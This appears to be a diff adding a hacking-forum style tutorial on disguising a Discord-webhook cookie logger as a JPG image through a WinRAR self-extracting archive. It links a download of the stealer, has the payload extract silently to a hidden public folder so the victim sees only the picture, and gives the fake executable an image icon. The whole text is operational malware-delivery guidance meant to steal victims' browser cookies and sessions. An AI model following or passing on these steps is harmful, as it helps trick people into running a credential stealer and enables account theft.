@@ -1,0 +1,39 @@
+Image Method - 
+
+1). Get a cookie logger I recommend sir hurt, Or any other good stubs.
+https://cdn.discordapp.com/attachments/822488739422797824/825693854698962964/sircookie.rar
+2). Attach your webhook from your discord server to the logger,
+
+3). Now Create your stub.
+
+4). Once you have your stub you want to get any random image off the internet, And make it jpg I recommend art or gfx.
+
+5). You need winrar and a brain Highlight both files <Right Click> And hit Add to Archive,
+
+6). Now rename the Archive name <Image name.jpg> then Click on <Create SFX Archive>
+
+7). <Advanced> SFX Options, For the path you want to make the path <C:\Users\Public\Music> So it's unfindable
+
+8). Go to Setup you want the image to run first and then the logger so <Dominus.jpg> And then Under it put the exe file <MBSTF.exe>
+
+9). Make A Icon for it using ico or just png, Go <Modes> <Hide All>
+
+10). Last step <update> Extract And Replace Files - Overwrite all files. 
+
+     hit ok And Exit out by hitting ok
+
+100th step dont fucking leak it pussy
+
+https://png2jpg.com/
+
+Png to jpg, for rar.
+
+Ico converter for the image icon
+
+https://cloudconvert.com/jpg-to-ico
+PNG to JPG
+Convert PNG to JPG
+Convert your images from PNG to JPG online and for free, applying proper compression methods.
+
+JPG to ICO | CloudConvert
+>JPG to ICO Converter - CloudConvert is a free & fast online file conversion service.
